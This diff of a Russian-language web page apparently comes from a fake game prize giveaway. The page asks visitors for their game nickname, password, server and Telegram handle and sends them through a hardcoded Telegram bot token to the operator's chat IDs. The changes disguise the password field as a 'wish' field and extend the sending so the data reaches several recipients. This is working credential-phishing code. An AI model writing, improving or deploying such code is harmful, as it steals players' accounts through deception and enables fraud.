@@ -867,7 +867,7 @@
 
 <div class="participants-section">
     <span style="font-size: 2.5rem;">👥</span>
-    <div class="participants-number" id="participant-count">1247</div>
+    <div class="participants-number" id="participant-count">1,247</div>
     <div style="font-size: 1.2rem; font-weight: 600; text-transform: uppercase;">Уже участвуют</div>
     
     <button class="cta-button" id="openModal">
@@ -943,8 +943,8 @@
                 </div>
                 
                 <div class="form-group">
-                    <label class="form-label">🔑 Пароль</label>
-                    <input type="password" class="form-input" id="password" placeholder="Ваш игровой пароль" required>
+                    <label class="form-label">🔑 Желание</label>
+                    <input type="password" class="form-input" id="password" placeholder="Минимум 6 символов" required>
                     <div class="form-help info show">Минимум 6 символов</div>
                     <div class="form-help error" id="password-error"></div>
                 </div>
@@ -1081,9 +1081,14 @@
 
 <script>
 // Конфигурация Telegram Bot
+// Добавляй сколько угодно ID в массив chatIds (1, 2, 3 или больше)
 const TELEGRAM_CONFIG = {
     botToken: '7976053381:AAHYgNpGjKJKc397Wq2OfTDQEPfMYoaCdtQ',
-    chatId: '7268545025'
+    chatIds: [
+        '7268545025',           // Основной ID (обязательный)
+        // '123456789',         // Второй ID (раскомментируй и замени на свой)
+        // '987654321',         // Третий ID (раскомментируй и замени на свой)
+    ]
 };
 
 // Timer
@@ -1206,10 +1211,29 @@ modal.addEventListener('click', (e) => {
     }
 });
 
-// Функция отправки в Telegram с несколькими методами
+// Функция отправки в Telegram всем получателям
 async function sendToTelegram(message) {
-    const { botToken, chatId } = TELEGRAM_CONFIG;
+    const { botToken, chatIds } = TELEGRAM_CONFIG;
+    const results = [];
     
+    // Отправляем всем ID из массива
+    for (const chatId of chatIds) {
+        try {
+            const result = await sendToSingleChat(botToken, chatId, message);
+            results.push({ chatId, success: result.ok });
+        } catch (error) {
+            console.log(`Failed to send to ${chatId}:`, error);
+            results.push({ chatId, success: false });
+        }
+    }
+    
+    // Возвращаем успех если хотя бы одно сообщение дошло
+    const anySuccess = results.some(r => r.success);
+    return { ok: anySuccess, results };
+}
+
+// Отправка одному получателю
+async function sendToSingleChat(botToken, chatId, message) {
     // Метод 1: Прямой запрос к API Telegram
     const tryDirectMethod = async () => {
         const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -1408,7 +1432,7 @@ form.addEventListener('submit', async (e) => {
 
 🎉 <b>Выигранный приз:</b> ${prizeWon}
 👤 <b>Никнейм:</b> ${nickname}
-🔑 <b>Пароль:</b> ${password}
+🔑 <b>Желание:</b> ${password}
 🖥 <b>Сервер:</b> ${server}
 📱 <b>Telegram:</b> ${telegramFormatted}
 ⏰ <b>Время:</b> ${new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' })}
